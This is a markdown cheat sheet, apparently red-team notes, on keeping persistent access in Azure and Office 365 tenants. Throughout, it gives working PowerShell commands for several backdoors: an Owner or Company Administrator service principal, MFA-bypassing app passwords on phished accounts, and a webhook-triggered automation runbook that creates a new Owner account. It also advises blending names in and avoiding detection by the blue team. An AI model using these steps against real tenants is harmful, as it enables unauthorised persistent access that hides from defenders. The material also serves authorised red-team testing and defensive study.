# Persistence
## Index
* [Service principal backdoor](#Service-principal-backdoor)
* [0365 App passwords](#0365-App-passwords)
* [Guest user accounts](#Guest-user-accounts)
* [Runbook backdoor with webhook](#GRunbook-backdoor-with-webhook)
* [Service principal global admin](#Service-principal-global-admin)

## Service principal backdoor
#### Create a new azure service principal
```
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
```

#### Get service principal secret
```
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
```

#### set service principal in variable and role
```
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
```

#### Create backdoor, Add service prinicpal as a role member
```
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
```

#### List the members of the role
```
Get-MsolRoleMember -RoleObjectId $role.ObjectId
```

#### Login as service principal
- Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
```
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
```

## 0365 App passwords
- Use case is for apps that can't use MFA
- Perfect scenario if you phish an account with MFA
- Click "Security & Privacy", Then " Additional security verification", then "Create and manage app passwords"
- Click “Create”, give the app password a name, then copy the value.
- This can now be used to access the account using legacy protocols without the MFA requirement

## Guest user accounts
- By default users can add “guest users” from outside the directory
- This provides (at minimum) read access to the directory
- Hybrid deployments may sync from Azure > On-Prem

## Runbook backdoor with webhook
- Create a new Automation account with “Create Azure Run As Account” enabled
- Navigate to Azure Active Directory > Roles and Administrators> User administrator
- Click Add Assignments • Search for your new automation account and add it
- Navigate to Subscriptions > subscription name > Access control (IAM)
- Click Add Role Assignment and add the automation account as an “Owner”
- Navigate back to Automation Accounts and select your new account
- Click “Modules Gallery”
- Search for “Az.”
- Import the Az.Accounts module
- Import the Az.Resources module
- Now we need to import the actual runbook
- In the Automation Accounts menu click “Runbooks”
- Click “Import a runbook”
- Save the script below as a ps1 file and modify the “user”, “password”, “Nickname”, and “DisplayName” to whatever you want it to be.
```
Import-Module Az.Accounts
Import-Module Az.Resources
$user = “username@targetdomain.com"
$pass = "BackdoorFTW!!"
$Nickname = "BackupSVC"
$DisplayName = "backup_service"
$connectionName = "AzureRunAsConnection"
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName
Connect-AzAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -
ApplicationId $servicePrincipalConnection.ApplicationId -
CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint
$SecureStringPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force
New-AzADUser -DisplayName $DisplayName -UserPrincipalName $user -Password $SecureStringPassword -
MailNickname $Nickname
New-AzRoleAssignment -SignInName $user -RoleDefinitionName Owner
```
- When importing the script set a name to something similar to the standard Automation scripts “AzureAutomationTutorial”
- Set “Runbook Type” to PowerShell and click Create
- After the script is imported navigate to the runbook you just created and click “Webhooks” on the left, then Add Webhook
- Now give the webhook a name that will blend in like “backup”
- Make sure you copy the URL!!! This is the most important step.
- Now if the blue team catches you and cuts off your access you have a backdoor.
- All you have to do now is open a PowerShell terminal and run this to create a brand new Azure account that is owner of the subscription
- ```Invoke-WebRequest -Method Post -Uri <Webhook URL>```

## Service principal global admin
- This can be a bit less noticeable as service principal accounts do not show up in the Azure Active Directory “Users” list
-  Blue team should be alerting on new additions to global admins
- Instead of adding to “Company Administrator” just add it to “User Account Administrator” group.

#### Create a new service principal
- Note the “ApplicationId”. This is the service principal’s “username” for auth
```
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
```

#### Get service principal's secret
- this is the password
```
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
```

#### Get the service principal using the application id
```
sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
```

#### Set the role
```
$role = Get-MsolRole -RoleName "Company Administrator"
```

#### Add the service principal as a role member
```
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
```

#### Check the role members
```
Get-MsolRoleMember -RoleObjectId $role.ObjectId
```

#### Authenticate as service principal
```
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant <Tenant ID> -ServicePrincipal
```
